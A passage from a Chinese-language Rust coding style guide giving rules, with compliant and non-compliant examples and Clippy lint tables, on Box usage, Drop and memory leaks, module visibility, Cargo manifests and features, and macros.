<p>或以下情况。来源 <a href="https://github.com/mmtk/mmtk-core/blob/ad95d7797f020eaab1e608dc03b7db6a3d79839a/src/plan/mutator_context.rs#L19">mmtk-core</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[repr(C)]
pub struct MutatorConfig&lt;VM: VMBinding&gt; {
    // ...

    /// Mapping between allocator selector and spaces. Each pair represents a mapping.
    /// Put this behind a box, so it is a pointer-sized field.
    // 这里是为了让字段拥有指针一样的大小，所以装箱了
    #[allow(clippy::box_collection)]
    pub space_mapping: Box&lt;SpaceMapping&lt;VM&gt;&gt;,
  
    // ...
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#box_collection">box_collection</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmembox03--一般情况下不应直接对栈分配类型进行-box-装箱"><a class="header" href="#gmembox03--一般情况下不应直接对栈分配类型进行-box-装箱">G.MEM.BOX.03  一般情况下，不应直接对栈分配类型进行 <code>Box</code> 装箱</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>此举会对性能造成不必要的影响。只有当某个栈变量太大，需要使用堆分配的情况下，或是栈变量需要逃逸的时候，才需要考虑是否对其使用 <code>Box</code> 装箱。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo(bar: usize) {}
// 不符合
let x = Box::new(1);
foo(*x);
println!(&quot;{}&quot;, *x);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn foo(bar: usize) {}
// 符合
let x = 1;
foo(x);
println!(&quot;{}&quot;, x);
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>用例来源：<a href="https://github.com/mjkillough/aitch/blob/69fbd677a72d0ed1851624d16a53c2a676d49bd5/src/servers/hyper.rs#L28">aitch</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub trait ServeFunc {
    fn call_box(self: Box&lt;Self&gt;) -&gt; Result&lt;()&gt;;
}

impl&lt;F&gt; ServeFunc for F
where
    F: FnOnce() -&gt; Result&lt;()&gt;,
{
    // 特殊情况，F 是泛型，且要匹配 trait定义
    #[cfg_attr(feature = &quot;cargo-clippy&quot;, allow(boxed_local))]
    fn call_box(self: Box&lt;Self&gt;) -&gt; Result&lt;()&gt; {
        (*self)()
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#boxed_local">boxed_local </a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="drop-析构"><a class="header" href="#drop-析构">Drop 析构</a></h1>
<p>在 Safe Rust 中，Drop 比较安全。在 Unsafe Rust 中则需要注意更多关于 Drop 的问题。 </p>
<h2 id="列表-5"><a class="header" href="#列表-5">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/memory/./drop/G.MEM.DRP.01.html">G.MEM.DRP.01 要注意防范内存泄漏</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmemdrp01-要注意防范内存泄漏"><a class="header" href="#pmemdrp01-要注意防范内存泄漏">P.MEM.DRP.01 要注意防范内存泄漏</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 语言并不保证避免内存泄漏，内存泄漏不属于 Rust 安全职责范围。使用 Rust 的时候需要注意下面情况可能会发生内存泄漏：</p>
<ol>
<li>循环引用导致没有正常调用析构函数</li>
<li>使用 <code>forget</code> / <code>leak</code> 等函数主动跳过析构</li>
<li>使用 <code>std::mem::ManuallyDrop</code> 构建数据结构而忘记析构</li>
<li>析构函数内部发生了 panic</li>
<li>程序中止（abort on panic）</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="314-模块"><a class="header" href="#314-模块">3.14 模块</a></h1>
<p>Rust 中一个文件 即一个模块，也可以通过  <code>mod</code> 来创建模块。多个文件放到同一个目录下，也可以成为一个模块。</p>
<p>模块相关有三个概念：</p>
<ol>
<li><code>mod</code>是 Rust 代码的“骨架”。</li>
<li><code>use</code> 则是用来决定使用或导出哪个模块中的具体的类型或方法。</li>
<li><code>Path</code>，则是一个命名系统，类似于命名空间。</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmod01--合理控制对外接口和模块之间的可见性"><a class="header" href="#pmod01--合理控制对外接口和模块之间的可见性">P.MOD.01  合理控制对外接口和模块之间的可见性</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust提供强大的模块（module）系统，并且可以管理这些模块之间的可见性（公有（public）或私有（private））。</p>
<p>1、对于提供给其他crate使用的对外函数、结构体、trait等类型需要严格控制对外pub的范围，避免将内部成员对外提供。</p>
<p>2、对于crate内部，mod之间可见的类型，需要添加上<code>pub(crate) </code>。</p>
<p>3、对于mod内部私有的类型，不要添加<code>pub(crate) </code>或者<code>pub</code>。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// lib.rs
pub mod sha512;
pub use sha512::Sha512;

// sha512.rs
pub struct Sha512 {
    inner: Sha512Inner, // inner作为内部结构体，不添加pub描述
}

<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmod02--将模块的测试移动到单独的文件有助于增加编译速度"><a class="header" href="#pmod02--将模块的测试移动到单独的文件有助于增加编译速度">P.MOD.02  将模块的测试移动到单独的文件，有助于增加编译速度</a></h2>
<p><strong>【描述】</strong></p>
<p>将模块的测试代码 移到一个单独的文件中，并且用 `#[cfg(test)] 来条件编译 tests 的mod，这样可以减少rebuild和编译时间，在大型项目中很重要。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>src/
|--codes.rs
|--codes/test.rs
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmod01--使用导入模块中的类型或函数在某些情况下需要带模块名前缀"><a class="header" href="#gmod01--使用导入模块中的类型或函数在某些情况下需要带模块名前缀">G.MOD.01  使用导入模块中的类型或函数，在某些情况下需要带模块名前缀</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>对于标准库中，很多人都熟知的类型 ，比如 <code>Arc</code>/ <code>Rc</code>/ <code>Cell</code>/ <code>HashMap</code> 等 ， 可以导入它们直接使用。</p>
<p>但是对于可能引起困惑的函数，比如 <code>std::ptr::replace</code> 和 <code>std::mem::replace</code> ，在使用它们的时候，就必须得带上模块前缀。</p>
<p>使用一些第三方库中定义的类型或函数，也建议带上crate或模块前缀。如果太长的话，可以考虑使用 <code>as</code>  或  <code>type</code> 来定义别名。</p>
<p>以上考虑都是为了增强代码的可读性、可维护性。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::sync::Arc;
let foo = Arc::new(vec![1.0, 2.0, 3.0]); // 直接使用 Arc
let a = foo.clone();

// 需要带上 ptr 前缀
use std::ptr;
let mut rust = vec!['b', 'u', 's', 't'];
// `mem::replace` would have the same effect without requiring the unsafe
// block.
let b = unsafe {
    // 符合
    ptr::replace(&amp;mut rust[0], 'r')
};
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmod02--如果是作为库供别人使用在-librs中重新导出对外类型函数和-trait-等"><a class="header" href="#gmod02--如果是作为库供别人使用在-librs中重新导出对外类型函数和-trait-等">G.MOD.02  如果是作为库供别人使用，在 <code>lib.rs</code>中重新导出对外类型、函数和 trait 等</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>这样使用方在使用的时候，就不需要<code>use crate::mod::mod::struct</code>，可以直接使用<code>use crate::struct</code>，好处是使用方<code>use</code>的时候会比较方便和直观。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// From syn crate
pub use crate::data::{
    Field, Fields, FieldsNamed, FieldsUnnamed, Variant, VisCrate, VisPublic, VisRestricted,
    Visibility,
};
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmod03-导入模块不要随便使用-通配符"><a class="header" href="#gmod03-导入模块不要随便使用-通配符">G.MOD.03 导入模块不要随便使用 通配符<code>*</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>使用通配符导入会污染命名空间，比如导入相同命名的函数或类型。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::wildcard_imports)]
<span class="boring">fn main() {
</span>use crate2::*; // Has a function named foo
foo(); // Calls crate1::foo
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::wildcard_imports)]
<span class="boring">fn main() {
</span>use crate1::foo; // Imports a function named foo
foo(); // Calls crate1::foo
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use prelude::*;

#[test]
use super::*
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#wildcard_imports">wildcard_imports</a></td><td>yes</td><td>no</td><td>pedantic</td><td>allow</td></tr>
</tbody></table>
<p>该 lint 可以通过 clippy 配置项 <code>warn-on-all-wildcard-imports = false</code> 来配置，用于是否禁用 <code>prelude</code>/ <code>super</code> (测试模块中) 使用通配符导入， 默认是 <code>false</code>。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmod04--一个项目中应该避免使用不同的模块布局风格"><a class="header" href="#gmod04--一个项目中应该避免使用不同的模块布局风格">G.MOD.04  一个项目中应该避免使用不同的模块布局风格</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Rust 支持两种 模块布局，文件夹内使用 <code>mod.rs</code> 或者是使用跟文件夹同名的文件名，来组织模块。</p>
<p>但是项目里如果混合这两种模块布局，是比较让人困惑的，最好统一为同一种风格。</p>
<p>上面两种  lint ，选择其中一种用于检查是否存在不同的模块布局。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::self_named_module_files, clippy::mod_module_files)]

<span class="boring">fn main() {
</span>// 不符合：使用 `self_named_module_files`，不允许下面模块布局
#![warn(clippy::self_named_module_files)]
src/
  stuff/
    stuff_files.rs
  stuff.rs
  lib.rs

// 不符合：使用 `mod_module_files`，不允许下面模块布局
#![warn(clippy::mod_module_files)]
src/
  stuff/
    stuff_files.rs
    mod.rs
  lib.rs
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合：使用 `self_named_module_files`，允许下面模块布局
#![warn(clippy::self_named_module_files)]
src/
  stuff/
    stuff_files.rs
    mod.rs
  lib.rs

// 符合：使用 `mod_module_files`，允许下面模块布局
#![warn(clippy::mod_module_files)]
src/
  stuff/
    stuff_files.rs
  stuff.rs
  lib.rs
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#self_named_module_files">self_named_module_files</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#mod_module_files">mod_module_files</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmod05-不要在私有模块中设置其内部类型或函数方法为-pubcrate"><a class="header" href="#gmod05-不要在私有模块中设置其内部类型或函数方法为-pubcrate">G.MOD.05 不要在私有模块中设置其内部类型或函数方法为 <code>pub(crate)</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>如果在私有模块中设置 <code>pub(crate)</code> 可能会让使用者产生误解。建议用 <code>pub</code> 代替。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>mod internal {
    // 不符合
    pub(crate) fn internal_fn() { }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
mod internal {
    // 此函数在模块外部不可见，可以使用 pub 或 继续保持私有
    pub fn internal_fn() { }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#redundant_pub_crate">redundant_pub_crate</a></td><td>yes</td><td>no</td><td>nursery</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="315-包管理"><a class="header" href="#315-包管理">3.15 包管理</a></h1>
<p>Cargo 不仅仅是包管理，它还是一个 Workflow 工具。这一节包含 Cargo 和 Crate 相关内容。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcar01-应该尽量把项目划分为合理的-crate-组合"><a class="header" href="#pcar01-应该尽量把项目划分为合理的-crate-组合">P.CAR.01 应该尽量把项目划分为合理的 crate 组合</a></h2>
<p><strong>【描述】</strong></p>
<p>将整个项目按一定逻辑划分为合理的 crate，在工程方面有利于组件化。并且 crate 是 Rust 的编译单元，也有助于提升编译速度。</p>
<p>但需要注意，crate 之间的依赖关系应该是单向的，避免相互依赖的情况。</p>
<p>但 Rust 中编译时间、性能、编译大小之间，在考虑优化的时候也是需要权衡的。 </p>
<p>内联是优化的关键，当编译单元越大，内联优化效果就越好。所以需要权衡 crate 划分的粒度。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcar02-不要滥用-features"><a class="header" href="#pcar02-不要滥用-features">P.CAR.02 不要滥用 Features</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 的 features 提供了方便的条件编译功能。从软件工程来说，features 适合应用于可选功能。</p>
<p>在使用 features 的时候，应该考虑到底是不是真的需要 features。</p>
<p>滥用 features 会带来额外的测试和静态检查的难度，需要保证不同 features 下的测试覆盖和静态检查情况。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcar03-使用-cargo-features-来代替---cfg-条件编译参数"><a class="header" href="#pcar03-使用-cargo-features-来代替---cfg-条件编译参数">P.CAR.03 使用 <code>cargo features</code> 来代替 <code>--cfg</code> 条件编译参数</a></h2>
<p><strong>【描述】</strong></p>
<p><code>cargo features</code> 为 Rust 原生的条件编译，可用于代替 <code>--cfg</code> 参数且兼容性更好。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pcar04-宜使用-cfg-来代替-cfg"><a class="header" href="#pcar04-宜使用-cfg-来代替-cfg">P.CAR.04 宜使用 <code>cfg!</code> 来代替 <code>#[cfg]</code></a></h2>
<p><strong>【描述】</strong></p>
<p><code>cfg!</code> 和正常代码一样，会检查全部函数逻辑，而 <code>#[cfg]</code> 是条件编译，则会跳过一些 Dead Code。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcar01-当项目是可执行程序而非库时建议使用-srcmainrs-和-srclibrs-模式"><a class="header" href="#gcar01-当项目是可执行程序而非库时建议使用-srcmainrs-和-srclibrs-模式">G.CAR.01 当项目是可执行程序而非库时，建议使用 <code>src/main.rs</code> 和 <code>src/lib.rs</code> 模式</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>crate</code> 结构类似于：</p>
<pre><code class="language-text">src/
  -- lib.rs
  -- main.rs
</code></pre>
<p>或</p>
<pre><code class="language-text">src/
  -- lib.rs
bin/
  -- main.rs
</code></pre>
<p>这样的好处有：</p>
<ol>
<li>便于单元测试。</li>
<li>有利于面向接口思考，让代码架构和逻辑更加清晰。</li>
</ol>
<p>若编写的可执行程序比较复杂，在 <code>main.rs</code> 里需要依赖太多东西时，那就需要创建 Workspace 把 <code>main.rs</code> 独立为一个 crate，而在这个 crate 内也没有必要再拆分为 <code>main</code> 和 <code>lib</code> 了。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcar02-crate-的-cargotoml-中应该包含必要的元信息"><a class="header" href="#gcar02-crate-的-cargotoml-中应该包含必要的元信息">G.CAR.02 Crate 的 Cargo.toml 中应该包含必要的元信息</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在 Cargo.toml 中应该包含必要的元信息，以便使用者知道它的作用。
此外，若要将 <code>crate</code> 发布到 crates.io 上的话，这些信息也是必须的。可参考 The Cargo Book 中的<a href="https://doc.rust-lang.org/cargo/reference/manifest.html">相关介绍</a>。</p>
<p><strong>【反例】</strong></p>
<pre><code class="language-toml"># 不符合：此 `Cargo.toml` 缺失介绍(description)项。无法发布到 crates.io。
[package]
name = &quot;clippy&quot;
version = &quot;0.0.212&quot;
repository = &quot;https://github.com/rust-lang/rust-clippy&quot;
readme = &quot;README.md&quot;
license = &quot;MIT OR Apache-2.0&quot;
keywords = [&quot;clippy&quot;, &quot;lint&quot;, &quot;plugin&quot;]
categories = [&quot;development-tools&quot;, &quot;development-tools::cargo-plugins&quot;]
</code></pre>
<p><strong>【正例】</strong></p>
<pre><code class="language-toml"># 符合：此 `Cargo.toml` 包含必要元信息。
[package]
name = &quot;clippy&quot;
version = &quot;0.0.212&quot;
description = &quot;A bunch of helpful lints to avoid common pitfalls in Rust&quot;
repository = &quot;https://github.com/rust-lang/rust-clippy&quot;
readme = &quot;README.md&quot;
license = &quot;MIT OR Apache-2.0&quot;
keywords = [&quot;clippy&quot;, &quot;lint&quot;, &quot;plugin&quot;]
categories = [&quot;development-tools&quot;, &quot;development-tools::cargo-plugins&quot;]
</code></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#cargo_common_metadata">cargo_common_metadata</a></td><td>yes</td><td>no</td><td>cargo</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcar03-feature-命名应该避免否定式或多余的前后缀"><a class="header" href="#gcar03-feature-命名应该避免否定式或多余的前后缀">G.CAR.03 Feature 命名应该避免否定式或多余的前后缀</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>Feature 命名应该避免出现 <code>no-</code> 或 <code>not-</code> 之类的否定前缀，或诸如 <code>use-</code>，<code>with-</code> 前缀或 <code>-support</code>后缀。Feature 的目的是正向的，可选的特性，使用否定式命名和它的目的背道而驰。</p>
<p><strong>【反例】</strong></p>
<pre><code class="language-toml">[features]
default = [&quot;no-abc&quot;, &quot;with-def&quot;, &quot;ghi-support&quot;]
no-abc = []         # 不符合：命名否定式
with-def = []       # 不符合：多余前缀
ghi-support = []    # 不符合：多余后缀
</code></pre>
<p><strong>【正例】</strong></p>
<pre><code class="language-toml"># 符合
[features]
default = [&quot;abc&quot;, &quot;def&quot;, &quot;ghi&quot;]
abc = []
def = []
ghi = []
</code></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#negative_feature_names">negative_feature_names</a></td><td>yes</td><td>no</td><td>cargo</td><td>allow</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#redundant_feature_names">redundant_feature_names</a></td><td>yes</td><td>no</td><td>cargo</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gcar04-cargotoml-中依赖包版本不应使用通配符"><a class="header" href="#gcar04-cargotoml-中依赖包版本不应使用通配符">G.CAR.04 Cargo.toml 中依赖包版本不应使用通配符</a></h2>
<p><strong>【级别】</strong> 要求</p>
<p><strong>【描述】</strong></p>
<p>依赖的包必须指定具体的语义版本。关于语义版本说明参见：<a href="https://doc.rust-lang.org/cargo/reference/semver.html">The Cargo Book: SemVer Compatibility</a>。</p>
<blockquote>
<p>使用 Clippy 需要设置 <code>#[warn(clippy::wildcard_dependencies)]</code>。</p>
</blockquote>
<p><strong>【反例】</strong></p>
<pre><code class="language-toml">[dependencies]
regex = &quot;*&quot; # 不符合：避免项目依赖因为上游更新而自动更新
</code></pre>
<p><strong>【正例】</strong></p>
<pre><code class="language-toml">[dependencies]
regex = &quot;1.5&quot; # 符合
</code></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#wildcard_dependencies">wildcard_dependencies</a></td><td>yes</td><td>no</td><td>cargo</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="316-宏"><a class="header" href="#316-宏">3.16 宏</a></h1>
<p>Rust 通过宏来支持元编程。其中宏有很多种，按实现方式可以分为两大类：声明宏（Declarative）和 过程宏（Procedural）。</p>
<p>按功能效果，过程宏又可以分为三类：</p>
<ol>
<li>Function-like 宏。类似于声明宏那样，像函数调用一样去使用的宏。</li>
<li>Derive 宏。用于为数据类型自动生成一些 语法项（item），比如 trait 、结构体、方法等。</li>
<li>Attribute 宏。用于更加通用的代码生成功能。</li>
</ol>
<p>Rust 语言核心库和标准库都内置了一些声明宏和过程宏，以方便开发者使用。</p>
<p>内置的属性宏按功能大体又可以分为四类：</p>
<blockquote>
<p>注：属性宏固定语法为 <code>#[attr]</code> 或 <code>#![attr]</code>，以下使用用例均已简化为 <code>attr</code> 的形式。即 <code>test</code>, <code>allow(c)</code> 代表其在 Rust 内的实现可分别表现为 <code>#[test]</code> 及 <code>#[allow(c)]</code>。</p>
</blockquote>
<ol>
<li>测试属性。<code>test</code> 属性宏用于将某个函数标记为单元测试函数。</li>
<li>诊断（<a href="https://doc.rust-lang.org/reference/attributes/diagnostics.html#diagnostic-attributes">Diagnostic</a>）属性。用于在编译过程中控制和生成诊断信息。包括：
<ol>
<li><code>allow(c)</code> / <code>warn(c)</code> / <code>deny(c)</code> / <code>forbid(c)</code>  等。</li>
<li><code>must_use</code> 。</li>
</ol>
</li>
<li><a href="https://doc.rust-lang.org/reference/attributes/codegen.html">代码生成属性</a>。包括：<code>inline</code> / <code>cold</code> / <code>target_feature</code> 等。</li>
<li><a href="https://doc.rust-lang.org/reference/attributes/limits.html">编译时限制属性</a>。包括：<code>recursion_limit </code> / <code>type_length_limit</code> 。</li>
<li><a href="https://doc.rust-lang.org/reference/attributes/type_system.html">类型系统属性</a>。包括：<code>non_exhaustive</code> 。</li>
</ol>
<p><strong>宏编程规范：</strong></p>
<p>使用宏时，需要从 <code>声明宏</code> 和 <code>过程宏</code> 各自的特性为出发点，来安全使用它。</p>
<ul>
<li><a href="safe-guides/coding_practice/./macros/decl.html">声明宏规范</a></li>
<li><a href="safe-guides/coding_practice/./macros/proc.html">过程宏规范</a></li>
</ul>
<p><strong>宏展开命令：</strong></p>
<pre><code class="language-text"># 对单个 rs 文件
rustc -Z unstable-options --pretty expanded hello.rs
# 对项目里的二进制 rs 文件
cargo rustc --bin hello -- -Z unstable-options --pretty=expanded
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmac01--不要轻易使用宏"><a class="header" href="#pmac01--不要轻易使用宏">P.MAC.01  不要轻易使用宏</a></h2>
<p><strong>【描述】</strong></p>
<p>当一个开发者想要能写出强大且用户友好的宏API时，不仅需要掌握如何用宏去实现，更需要掌握宏之外关于 Rust 的一切。</p>
<p>宏设计的重点在于宏生成什么样的代码，而不是宏如何生成代码。</p>
<p>宏只是将 Rust 语言特性以一种有趣的方式组合在一起能自动生成代码的创造力。</p>
<p>尤其是过程宏，它有一定复杂性，且很难调试，不卫生，也容易出错，不适用于新手。</p>
<blockquote>
<p>&quot;卫生&quot; 这个词表示，宏展开后，不会污染原来的词法作用域。</p>
</blockquote>
<p><strong>【参考】</strong></p>
<p><a href="https://github.com/dtolnay/case-studies">Rust 社区顶级专家 David Tolnay 写的宏学习案例</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmac02-实现宏语法的时候应该尽量贴近-rust-语法"><a class="header" href="#pmac02-实现宏语法的时候应该尽量贴近-rust-语法">P.MAC.02 实现宏语法的时候，应该尽量贴近 Rust 语法</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 宏可以让开发者定义自己的 DSL，但是在使用宏的时候，要尽可能贴近 Rust 的语法。这样可以增强可读性，让其他开发者在使用宏的时候，可以猜测出它生成的代码。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合：无关键词
bitflags! {
    S: u32 { /* ... */ }
}

// 不符合：或使用一些自定义的特定用途关键词
bitflags! {
    flags S: u32 { /* ... */ }
}

// 或
bitflags! {
    struct S: u32 {
        const E = 0b010000, // 不符合：结尾应该是分号更符合 Rust 语法
        const F = 0b100000,
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>bitflags! {
    struct S: u32 { /* ... */ } // 符合
}

// 符合：结尾是正确的分号
bitflags! {
    struct S: u32 {
        const C = 0b000100;
        const D = 0b001000;
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmac01-dbg-宏只应该用于调试代码"><a class="header" href="#gmac01-dbg-宏只应该用于调试代码">G.MAC.01 <code>dbg!()</code> 宏只应该用于调试代码</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p><code>dbg!()</code> 宏是 Rust 内置的宏，其目的是用于调试代码。 不要将含有 dbg! 宏的代码加入到版本控制下。</p>
<p>注意：不管在 Debug 模式还是 Release 模式下，调试信息都会被打印出来。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::dbg_macro)]
<span class="boring">fn main() {
</span>// 不符合：代码加入版本控制时还保留着 dbg! 代码
let foo = false;
dbg!(foo); 
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::dbg_macro)]

<span class="boring">fn main() {
</span>// 符合：代码加入版本控制时注释掉 dbg! 代码
let foo = false;
// dbg!(foo); 
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#dbg_macro">dbg_macro</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmac02-使用宏时应该考虑宏展开会让编译文件膨胀的影响"><a class="header" href="#gmac02-使用宏时应该考虑宏展开会让编译文件膨胀的影响">G.MAC.02 使用宏时应该考虑宏展开会让编译文件膨胀的影响</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>在多个地方使用 <code>println!</code> 或 <code>panic!</code> 之类的内置宏时，可以将其包装到函数内，使用 <code>#[cold]</code> 和 <code>#[inline(never)]</code> 属性避免其内联，从而避免编译文件膨胀。</p>
<p>因为像 <code>println!</code> 或 <code>panic!</code> 之类的宏，如果到处使用，就会到处展开代码，会导致编译文件大小膨胀。尤其在嵌入式领域需要注意。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub fn expect(self, msg: &amp;str) -&gt; T {
    match self {
